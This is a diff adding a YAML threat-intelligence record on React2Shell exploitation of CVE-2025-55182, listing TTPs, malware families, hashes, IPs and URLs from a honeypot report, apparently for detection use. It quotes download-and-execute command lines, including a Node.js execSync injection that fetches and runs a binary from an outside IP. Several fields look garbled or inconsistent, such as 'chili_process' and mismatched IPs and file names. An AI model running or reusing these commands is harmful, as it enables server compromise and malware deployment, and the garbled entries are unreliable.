@@ -1,0 +1,60 @@
+description: React2Shell Exploitation targeting CVE-2025-55182 with Node.js process
+  execution primitives and commodity malware deployment.
+attribution: China-nexus threat groups
+malware_families:
+- CoinMiner.Gen2
+- Turnt
+TTPs:
+  processes:
+  - mdockerd
+  commandline:
+  - execsync("hoani);"
+  - busybox wget http://89.144.31.10/muts/x00; chmod 777 X60; ./X60
+  - ./bo1ts -0-[sh)
+  - process.mainModule.require(child_process).execSync("cd /dev; busybox wget http://89.144.31.10/muts/x00;chmod 777 X60; ./X60")
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - child_process
+  - chili_process
+  network_connections:
+  - mdockerd, 89.144.31.10, 80
+  - mdockerd, 69.144.31.10, 80
+  file_activity:
+  - /dev/X60
+  - /_next/data/
+  - /_next/refresh/
+  - /_next/redirect/
+  - /_next/turbopack/flight/
+  - /_next/webpack-hmr/
+  - /_next/server-actions/
+  - /_react/flight/
+  - /_next/flight/
+  persistence:
+  - upx
+  - persistenceDETECTION DETALS
+  process_relations: []
+CVEs:
+- CVE-2025-55182
+IOCs:
+  hashes:
+  - 9007bb4a6b8cdeff55224dbbd4b1516669f0737e5ff4590cd4c5aa9cc5b464ed
+  - bb6a05f3bcc5a7bbf5bdf6e5d555c3d51008dcc16f77c48409cad03a06576407
+  - 7e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171
+  - 2530ebc8e77c784ffe628b3588739ff096a2af4437656144983d1ba04b11538f
+  ip_addresses:
+  - 47.252.11.60
+  - 188.253.116.146
+  - 85.11.167.3
+  - 143.198.145.163
+  domains: []
+  urls:
+  - https://github.com/Ashwesker/Blackash-CVE-2025-55182/
+  - http://89.144.31.10/muts/x00
+  - http://69.144.31.10/nuts/bo1ts
+authors:
+- DefusedCyber
+reference: https://defusedcyber.com/react2shell-exploitation-honeypot-analysis
+date_of_publication: December 07, 2025
+file_creation_date: March 04, 2026
